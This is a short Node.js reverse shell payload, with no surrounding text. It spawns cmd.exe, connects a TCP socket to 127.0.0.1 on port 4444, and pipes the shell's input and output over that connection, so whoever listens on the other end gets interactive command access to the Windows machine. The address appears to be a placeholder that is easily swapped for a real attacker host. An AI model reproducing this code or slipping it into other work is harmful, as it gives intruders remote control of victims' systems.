var net = require("net"), sh = require("child_process").exec("cmd.exe");
var client = new net.Socket();
client.connect(4444, "127.0.0.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});